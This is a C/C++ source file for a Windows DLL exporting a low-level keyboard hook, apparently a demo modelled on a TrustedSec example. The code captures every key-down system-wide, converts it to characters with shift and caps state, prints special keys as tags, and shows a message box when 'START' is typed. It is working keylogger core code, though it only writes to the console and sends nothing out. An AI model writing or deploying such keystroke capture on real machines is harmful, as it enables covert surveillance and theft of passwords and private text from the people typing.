#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "user32.lib")

// For trigger (optional – keep like TrustedSec style)
static char buffer[6] = {0};
static char lastVk    = 0;

static void AddToBuffer(char c) {
    memmove(buffer, buffer + 1, 4);
    buffer[4] = c;
    buffer[5] = '\0';
}

extern "C" __declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc(
    int    nCode,
    WPARAM wParam,
    LPARAM lParam)
{
    if (nCode != HC_ACTION) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    // Capture EVERY key DOWN (WM_KEYDOWN / WM_SYSKEYDOWN)
    if (wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    KBDLLHOOKSTRUCT* kb   = (KBDLLHOOKSTRUCT*)lParam;
    DWORD            vk   = kb->vkCode;
    DWORD            scan = kb->scanCode;
    BOOL             isUp = (kb->flags & LLKHF_UP) != 0;  // usually false on down

    // Simple repeat filter (optional)
    if (vk == (DWORD)lastVk) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    lastVk = (char)vk;

    // ── Try to get real character (handles shift, caps, symbols, etc.) ───────
    WCHAR unicode[16] = {0};
    BYTE  kbState[256] = {0};

    // Get current modifier state (shift, ctrl, alt, caps)
    GetKeyboardState(kbState);

    int len = ToUnicode(
        vk,
        scan,
        kbState,
        unicode,
        _countof(unicode),
        0
    );

    char ch = 0;
    if (len > 0) {
        ch = (char)unicode[0];   // take first char
    }

    // Fallback for special keys if ToUnicode didn't give anything useful
    if (ch == 0) {
        switch (vk) {
            case VK_RETURN:   printf("[ENTER]\n");   goto LOG_DONE;
            case VK_BACK:     printf("[BACK]");      goto LOG_DONE;
            case VK_TAB:      printf("[TAB]");       goto LOG_DONE;
            case VK_SPACE:    printf(" ");           goto LOG_DONE;
            case VK_ESCAPE:   printf("[ESC]");       goto LOG_DONE;
            case VK_LEFT:     printf("[LEFT]");      goto LOG_DONE;
            case VK_RIGHT:    printf("[RIGHT]");     goto LOG_DONE;
            // add more if needed (F-keys, arrows, etc.)
            default:          printf("[VK_%02X]", vk); goto LOG_DONE;
        }
    }

    // Printable char
    printf("%c", ch);

LOG_DONE:
    fflush(stdout);  // make sure output appears immediately

    // Optional: keep TrustedSec-style trigger on letters
    if (ch >= 'A' && ch <= 'z') {
        AddToBuffer(ch);
        if (strncmp(buffer, "START", 5) == 0) {
            printf("\n[!] TRIGGER 'START' DETECTED!\n");
            MessageBoxA(NULL, "Hook activated via START!", "Demo", MB_OK | MB_ICONWARNING);
            memset(buffer, 0, sizeof(buffer));
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            memset(buffer, 0, sizeof(buffer));
            break;
    }
    return TRUE;
}